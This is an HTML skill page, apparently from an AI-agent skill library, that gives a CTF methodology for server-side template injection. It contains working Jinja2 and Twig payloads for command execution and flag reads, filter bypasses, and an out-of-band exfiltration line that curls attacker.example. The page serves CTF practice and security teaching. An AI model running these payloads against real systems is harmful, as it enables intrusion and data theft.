@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ctf-web-challenges-ssti-challenges</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ctf-web-challenges-ssti-challenges</h2><div class="meta"><span class="badge gray">ctf</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when a CTF web challenge renders user input through a</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><div class="deps"><span class="kind">requires:</span> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>curl</td><td>8.5</td></tr><tr><td>Node.js</td><td>22.11</td></tr></tbody></table><p>Server-side template injection happens when user input is embedded in a template that the server evaluates, turning template syntax into code execution. In CTFs it is one of the fastest paths from input to flag: detect with a math probe, identify the engine, walk the object graph to <code>os</code>, and read the flag. This sub-skill covers the authorized methodology for Jinja2 (the most common), plus Twig/Smarty notes, blind variants, and filter bypasses. Scope is CTF competitions, lab apps, and systems you have explicit permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Detect: submit <code>{{7*7}}</code>, <code>${7*7}</code>, <code>#{7*7}</code>, and <code>&lt;%= 7*7 %&gt;</code>; a</li>
+<p><code>49</code> in the response confirms SSTI and hints the engine.</p>
+<li>Identify the engine from source, error messages, or the probe that</li>
+<p>worked (Jinja2/Twig use <code>{{}}</code>, Freemarker <code>${}</code>, ERB <code>&lt;%= %&gt;</code>).</p>
+<li>Fingerprint the sandbox: try <code>{{7*&#x27;7&#x27;}}</code> (should be <code>7777777</code>),</li>
+<p><code>{{config}}</code>, <code>{{self}}</code> to see what objects are reachable.</p>
+<li>Walk to code execution via the standard gadget chain for that</li>
+<p>engine (subclass traversal for Jinja2).</p>
+<li>Read the flag: <code>cat /flag*</code>, check <code>/app</code>, environment variables,</li>
+<p>and the database as needed.</p>
+<li>If output is not reflected, switch to blind techniques (time</li>
+<p>delays, out-of-band reads, or error-based exfiltration).</p>
+<li>If filters block syntax, bypass with alternative delimiters,</li>
+<p>string concatenation, or filter-chain tricks.</p>
+<li>Record the working payload verbatim for the writeup.</li>
+</ol>
+<h2>1. Detection and engine identification</h2>
+<pre><code class="language-bash">U=&quot;http://chals.ctf:8000/hello&quot;
+for p in &#x27;{{7*7}}&#x27; &#x27;${7*7}&#x27; &#x27;#{7*7}&#x27; &#x27;&lt;%= 7*7 %&gt;&#x27; &#x27;{{7*&quot;7&quot;}}&#x27;; do
+  echo &quot;--- $p&quot;
+  curl -s -X POST $U -d &quot;name=$p&quot; | head -c 200; echo
+done
+# {{7*7}} -&gt; 49        : Jinja2 (Python) or Twig (PHP)
+# ${7*7}  -&gt; 49        : Freemarker / Velocity (Java)
+# &lt;%= 7*7 %&gt; -&gt; 49     : ERB (Ruby) or EJS (Node)
+# {{7*&quot;7&quot;}} -&gt; 7777777 : confirms real evaluation, not string math</code></pre>
+<p>Engine-specific follow-ups: <code>{{_self}}</code> renders in Twig, <code>{{config}}</code> renders in Flask/Jinja2, <code>${&quot;freemarker&quot;}</code> hints Java. When source is provided, skip probing and read the render call directly.</p>
+<h2>2. Jinja2 exploitation ladder</h2>
+<p>Jinja2 is the most common CTF SSTI engine. Climb from recon to RCE.</p>
+<pre><code class="language-bash"># Step 1: what classes are reachable? (dumps huge output, grep it)
+curl -s -X POST $U -d &#x27;name={{ &quot;&quot;.__class__.__mro__ }}&#x27;
+
+# Step 2: list subclasses, find one with os in globals (index varies!)
+# do this locally with the same Python version instead of remotely:
+python3 -c &quot;
+subs = &#x27;&#x27;.__class__.__mro__[1].__subclasses__()
+for i, c in enumerate(subs):
+    g = getattr(getattr(c, &#x27;__init__&#x27;, None), &#x27;__globals__&#x27;, {})
+    if &#x27;os&#x27; in g: print(i, c.__name__)
+&quot;
+# example output: 139 _wrap_close  (index changes per build: verify!)
+
+# Step 3: RCE via the found subclass (example index 139)
+curl -s -X POST $U --data-urlencode \
+  &quot;name={{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() }}&quot;
+
+# Step 4: read the flag
+curl -s -X POST $U --data-urlencode \
+  &quot;name={{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag*&#x27;).read() }}&quot;</code></pre>
+<p>Shorter alternative gadget paths (when <code>__class__</code> is filtered):</p>
+<pre><code>{{ cycler.__init__.__globals__.os.popen(&#x27;cat /flag.txt&#x27;).read() }}
+{{ joiner.__init__.__globals__.os.popen(&#x27;cat /flag.txt&#x27;).read() }}
+{{ namespace.__init__.__globals__.os.popen(&#x27;cat /flag.txt&#x27;).read() }}</code></pre>
+<p>These work because Jinja2 exposes <code>cycler</code>, <code>joiner</code>, and <code>namespace</code> objects whose <code>__init__.__globals__</code> contains <code>os</code>.</p>
+<h2>3. Reading files without os.popen</h2>
+<p>When <code>os</code> is blocked but the object graph is open, read files through other loaders:</p>
+<pre><code>{# via the open builtin reached through globals #}
+{{ self.__init__.__globals__.__builtins__.open(&#x27;/flag.txt&#x27;).read() }}
+
+{# via importlib when builtins are reachable #}
+{{ self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read() }}</code></pre>
+<p>If only a few attributes are blocked, build blocked strings by concatenation: <code>{{ &#x27;o&#x27;+&#x27;s&#x27; }}</code> or use <code>request.args</code> to smuggle the payload in a second parameter the filter does not inspect.</p>
+<h2>4. Twig (PHP) SSTI</h2>
+<pre><code class="language-bash"># Detection: {{7*7}} -&gt; 49 suggests Twig or Jinja2; _self only exists in Twig
+curl -s -X POST $U -d &#x27;name={{_self}}&#x27;
+
+# Twig RCE (version dependent; try in order)
+{{_self.env.setCache(&quot;ftp://attacker:pass@host/&quot;)}}
+{{_self.env.getCache(&quot;id&quot;)}}
+
+# Newer Twig: via the template object to native functions
+{{[&#x27;id&#x27;]|map(&#x27;system&#x27;)|join}}
+{{[&#x27;cat /flag*&#x27;]|map(&#x27;system&#x27;)|join}}</code></pre>
+<p>Identify the Twig version from source or error output first; payloads shift between major versions.</p>
+<h2>5. Blind SSTI</h2>
+<p>When the template output is not reflected (stored templates, log rendering), exfiltrate out of band.</p>
+<pre><code class="language-bash"># Time-based confirmation (Jinja2): sleep via os
+# {{ namespace.__init__.__globals__.os.popen(&#x27;sleep 5&#x27;).read() }}
+time curl -s -X POST $U --data-urlencode &quot;name={{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;sleep 5&#x27;).read() }}&quot; -o /dev/null
+# 5+ seconds -&gt; code execution confirmed
+
+# Out-of-band exfiltration (if the challenge network allows egress)
+# {{ ...os.popen(&#x27;curl https://attacker.example/$(cat /flag.txt)&#x27;).read() }}</code></pre>
+<p>Blind boolean variant: <code>{% if ... %}true{% endif %}</code> conditionals that change a status code or page length let you extract the flag character by character, same loop shape as blind SQLi.</p>
+<h2>6. Filter bypasses</h2>
+<p>CTF filters commonly block <code>{{</code>, <code>__</code>, <code>.</code>, or keywords. Bypasses:</p>
+<ul>
+<li>Blocked <code>{{</code>/<code>}}</code>: try <code>{% ... %}</code> with print via <code>{%= ... %}</code> in</li>
+<p>some engines, or smuggle through a second parameter.</p>
+<li>Blocked underscores: <code>{{ request.args.a }}</code> with <code>?a=__class__</code></li>
+<p>pulls the string from outside the filtered input.</p>
+<li>Blocked dots: <code>{{ &#x27;&#x27;[&#x27;__class__&#x27;] }}</code> uses subscript instead of</li>
+<p>attribute access.</p>
+<li>Blocked keywords (<code>os</code>, <code>popen</code>): concatenate</li>
+<p><code>{{ &#x27;po&#x27;+&#x27;pen&#x27; }}</code>, or reach equivalents (<code>subprocess</code>, <code>system</code>).</p>
+<li>Read the filter code from source and bypass it exactly; filters</li>
+<p>that strip once are beaten by nesting (<code>{{{{</code> -&gt; <code>{{</code>).</p>
+</ul>
+<h2>Edge cases</h2>
+<ul>
+<li>The template engine autoescapes HTML: SSTI still works because</li>
+<p>evaluation happens before escaping; only the output display changes.</p>
+<li>Sandboxed Jinja2 (<code>SandboxedEnvironment</code>): attribute access to</li>
+<p>underscored names is blocked; use the <code>request.args</code> smuggling or documented sandbox escapes for the pinned version.</p>
+<li>The injection is in an email template rendered offline: output goes</li>
+<p>to a file or mail queue; read it through the app&#x27;s file download or admin view.</p>
+<li>Multiple render passes: the app renders twice; a payload like</li>
+<p><code>{{7*7}}</code> may need double encoding to survive the first pass.</p>
+<li>The engine is obscure (Mako, Pug, Velocity): identify it from error</li>
+<p>pages or source imports first; payloads do not transfer between engines.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Subclass index from the internet does not work: enumerate locally</li>
+<p>with the challenge&#x27;s Python version (docker image if provided); indices shift between builds.</p>
+<li><code>os.popen</code> is blocked but <code>__subclasses__</code> works: pivot to file</li>
+<p>read via <code>open</code> in builtins, or to <code>subprocess.Popen</code>.</p>
+<li>Nothing executes and no error shows: verify the probe actually</li>
+<p>reaches the template (add a canary string), and check whether the route you test is the one rendering.</p>
+<li>The flag is not on the filesystem: from the SSTI shell, check</li>
+<p><code>env</code>, the app config (<code>{{config}}</code> often leaks secrets), and the database credentials for the next hop.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see SSTI as template delimiters (<code>{{</code>, <code>${</code>, <code>&lt;%=</code>) and dunder-heavy payloads (<code>__class__</code>, <code>__globals__</code>, <code>__subclasses__</code>) in request logs, often in long encoded POST bodies. Successful exploitation shows as web-user processes spawning shells or making odd outbound connections. Durable fixes: never build template strings from user input (use template files with variable passing), enable sandboxed environments with tight allowlists, and keep template engines patched. Log and alert on <code>__class__</code> substrings in input as a cheap signal.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-94 (Improper Control of Generation of Code, Code Injection):</li>
+<p>covers template injection.</p>
+<li>CWE-20 (Improper Input Validation): unsanitized template input.</li>
+<li>PortSwigger SSTI guide: https://portswigger.net/web-security/cross-site-scripting/server-side-template-injection</li>
+<li>HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
